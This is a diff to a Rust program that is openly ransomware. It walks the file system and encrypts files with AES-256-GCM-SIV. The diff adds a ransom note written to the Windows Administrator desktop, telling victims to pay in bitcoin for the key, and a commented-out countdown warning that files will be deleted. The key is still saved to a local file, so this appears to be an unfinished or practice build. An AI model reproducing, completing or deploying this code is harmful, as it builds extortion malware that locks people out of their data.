@@ -18,7 +18,8 @@ use std::fs::{File, OpenOptions};
 use std::io::{Read, Write};
 use std::path::PathBuf;
 use std::process::Command;
-use std::{fmt, fs};
+use std::time::Duration;
+use std::{fmt, fs, thread};
 use std::{io, path::Path};
 use walkdir::{DirEntry, Error, WalkDir};
 //TODO: check the speed of this later
@@ -49,10 +50,9 @@ fn main() -> Result<(), std::io::Error> {
         }
     }
 
-    let mut rng = ChaCha20Rng::from_entropy(); //FIXME: later. I dont like that this rng code is repeated twice
+    let mut rng = ChaCha20Rng::from_entropy(); 
     let mut nonce_array = [0u8; 12];
     rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
-                                      // let nonce = Nonce::from_slice(&nonce_array);
     let key = Aes256GcmSiv::generate_key(rng);
     let mut cipher = Aes256GcmSiv::new(&key);
     let _ = traverse(true, &mut cipher); //iterates through all the files and calls the encrypt function on each one
@@ -63,12 +63,12 @@ fn main() -> Result<(), std::io::Error> {
     keyfile.write_all(&hex::encode(&key).as_bytes())?;
     writeln!(keyfile, "\n\n\nhello")?;
     drop(keyfile);
-    let _ = traverse(false, &mut cipher); //decrypt
-                                          //write hex::
-                                          // let mut keyfile = File::create("C:\\Users\\Administrator\\Desktop\\key.txt")?;
-                                          // keyfile.write_all(&hex::encode(&key).as_bytes())?;
-                                          // writeln!(keyfile, "\n\n\nhello")?;
-                                          // drop(keyfile);
+
+    let mut ransom_note = File::create("C:\\Users\\Administrator\\Desktop\\README.txt")?;
+    writeln!(ransom_note, "hello, your files have been encrypted :)\nwhat do i do?\n* to decrypt your files, you need a key. pay me at [bitcoin address here]\n * DO NOT rename any encrypted files. if you change the extension, decryption will not work")?;
+    drop(ransom_note);
+
+    let _ = traverse(false, &mut cipher); 
     Ok(())
 }
 
@@ -88,6 +88,13 @@ fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
     if !do_encrypt {
         loop {
             let mut user_input = String::new();
+            // for i in (0..=20).rev() {
+            //     print!("Your files will be deleted in: \r{}", i);
+            //     io::stdout().flush().unwrap();
+            //     thread::sleep(Duration::from_secs(1));
+            // }
+            // println!("\nCountdown complete!");
+            
             println!("Enter decryption key pls: ");
             io::stdin().read_line(&mut user_input).unwrap();
             let user_input_str = user_input.trim(); //convert to bytes
@@ -144,7 +151,6 @@ fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
                             // Rename the file
                             fs::rename(a_file, old_filename);
 
-
                             if let Some(extension) = entry.path().extension() {
                                 //if
                             }
@@ -170,7 +176,7 @@ fn traverse(do_encrypt: bool, cipher: &mut Aes256GcmSiv) -> Result<(), Error> {
                             }
                         }
                     } else {
-                        println!("skipped file: {}", entry.path().display());
+                        // println!("skipped file: {}", entry.path().display());
                     }
                 }
             }
@@ -224,6 +230,7 @@ fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
     // Open a file with append option
 
     println!("encrypting file: {}", path.display());
+
     let mut file = File::open(path)?;
     let mut buffer = Vec::new();
     file.read_to_end(&mut buffer)?;
@@ -249,11 +256,9 @@ fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), MyError> {
     let mut buffer = Vec::new();
     file.read_to_end(&mut buffer)?;
 
-    //FIXME: get nonce from first 12 bytes from file
     let nonce = Nonce::from_slice(&buffer[0..12]);
     let ciphertext = &buffer[12..];
 
-    // let cipher = Aes256GcmSiv::new(&decrypt_key);
     println!("decrypting file: {}", path.display());
     match cipher.decrypt(nonce, ciphertext.as_ref()) {
         Ok(plaintext) => {
@@ -263,10 +268,7 @@ fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), MyError> {
             file.write_all(&plaintext.as_slice())?;
         }
         Err(e) => {
-            eprintln!("Decrypt fail: {:?}", e); //FIXME: return
-                                                //skip fail
-                                                // return Err(e.into());
-                                                // return Err(MyError::from(e));
+            eprintln!("Decrypt fail: {:?}", e); 
         }
     }
 
